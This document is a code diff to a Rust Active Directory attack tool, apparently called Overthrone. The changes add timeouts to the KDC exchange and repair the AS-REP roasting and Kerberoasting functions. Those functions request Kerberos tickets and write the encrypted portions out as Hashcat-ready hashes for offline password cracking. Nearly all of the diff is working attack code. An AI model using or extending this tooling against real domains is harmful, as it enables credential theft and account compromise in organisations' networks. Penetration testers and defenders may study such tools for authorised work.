@@ -167,13 +167,22 @@ async fn kdc_exchange(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> {
         .parse()
         .map_err(|e| OverthroneError::Kerberos(format!("Invalid KDC address: {e}")))?;
 
-    let mut stream = TcpStream::connect(addr)
-        .await
-        .map_err(|e| OverthroneError::Kerberos(format!("Cannot reach KDC at {addr}: {e}")))?;
+    let mut stream = tokio::time::timeout(
+        std::time::Duration::from_secs(10),
+        TcpStream::connect(addr),
+    )
+    .await
+    .map_err(|_| OverthroneError::Kerberos(format!("KDC connection timed out after 10s: {addr}")))?
+    .map_err(|e| OverthroneError::Kerberos(format!("Cannot reach KDC at {addr}: {e}")))?;
 
     debug!("Connected to KDC at {addr}");
     kdc_send(&mut stream, request_bytes).await?;
-    kdc_recv(&mut stream).await
+    tokio::time::timeout(
+        std::time::Duration::from_secs(15),
+        kdc_recv(&mut stream),
+    )
+    .await
+    .map_err(|_| OverthroneError::Kerberos(format!("KDC response timed out after 15s: {addr}")))?
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -393,12 +402,20 @@ pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<Cr
     match AsRep::parse(&response_bytes) {
         Ok((_, as_rep)) => {
             let enc_part = &as_rep.enc_part;
-            let cipher_hex = hex::encode(&enc_part.cipher);
+            let cipher = &enc_part.cipher;
 
-            // Hashcat mode 18200 format
+            // Hashcat mode 18200 format:
+            // $krb5asrep$23$user@realm:<checksum_32hex>$<edata2_hex>
+            // RC4: checksum = first 16 bytes; AES256: first 12 bytes
+            let cksum_len = if enc_part.etype == ETYPE_RC4_HMAC { 16 } else { 12 };
+            let (checksum, edata2) = cipher.split_at(std::cmp::min(cksum_len, cipher.len()));
             let hash_string = format!(
-                "$krb5asrep${}${}@{}:{}",
-                enc_part.etype, username, realm, cipher_hex
+                "$krb5asrep${}${}@{}:{}${}",
+                enc_part.etype,
+                username,
+                realm,
+                hex::encode(checksum),
+                hex::encode(edata2),
             );
 
             info!("AS-REP hash obtained for {username}");
@@ -536,23 +553,56 @@ pub async fn kerberoast(
     let (_, tgs_rep) =
         TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
 
-    // Extract encrypted part of the SERVICE TICKET for offline cracking
+    // Extract encrypted part of the SERVICE TICKET for offline cracking.
+    // Hashcat expects the cipher split into checksum and encrypted data:
+    //   RC4  (mode 13100): $krb5tgs$23$*user$realm$spn*$<checksum_32hex>$<edata2_hex>
+    //     checksum = first 16 bytes of cipher
+    //   AES256 (mode 19700): $krb5tgs$18$user$realm$*spn*$<checksum_24hex>$<edata2_hex>
+    //     checksum = first 12 bytes of cipher
+    //   AES128 (mode 19600): same structure with etype 17
     let enc_part = &tgs_rep.ticket.enc_part;
-    let cipher_hex = hex::encode(&enc_part.cipher);
+    let cipher = &enc_part.cipher;
 
     let hash_string = match enc_part.etype {
-        ETYPE_RC4_HMAC => format!(
-            "$krb5tgs${}$*{}${}${}*${}",
-            enc_part.etype, tgt.client_principal, realm, target_spn, cipher_hex
-        ),
-        ETYPE_AES256_CTS => format!(
-            "$krb5tgs${}${}${}$*{}*${}",
-            enc_part.etype, tgt.client_principal, realm, target_spn, cipher_hex
-        ),
-        etype => format!(
-            "$krb5tgs${}${}${}${}${}",
-            etype, tgt.client_principal, realm, target_spn, cipher_hex
-        ),
+        ETYPE_RC4_HMAC => {
+            // RC4: 16-byte HMAC-MD5 checksum + encrypted data
+            let (checksum, edata2) = cipher.split_at(std::cmp::min(16, cipher.len()));
+            format!(
+                "$krb5tgs${}$*{}${}${}*${}${}",
+                enc_part.etype,
+                tgt.client_principal,
+                realm,
+                target_spn,
+                hex::encode(checksum),
+                hex::encode(edata2),
+            )
+        }
+        ETYPE_AES256_CTS => {
+            // AES256: 12-byte HMAC-SHA1-96 checksum + encrypted data
+            let (checksum, edata2) = cipher.split_at(std::cmp::min(12, cipher.len()));
+            format!(
+                "$krb5tgs${}${}${}$*{}*${}${}",
+                enc_part.etype,
+                tgt.client_principal,
+                realm,
+                target_spn,
+                hex::encode(checksum),
+                hex::encode(edata2),
+            )
+        }
+        etype => {
+            // AES128 or other: same 12-byte checksum split
+            let (checksum, edata2) = cipher.split_at(std::cmp::min(12, cipher.len()));
+            format!(
+                "$krb5tgs${}${}${}${}${}${}",
+                etype,
+                tgt.client_principal,
+                realm,
+                target_spn,
+                hex::encode(checksum),
+                hex::encode(edata2),
+            )
+        }
     };
 
     info!(
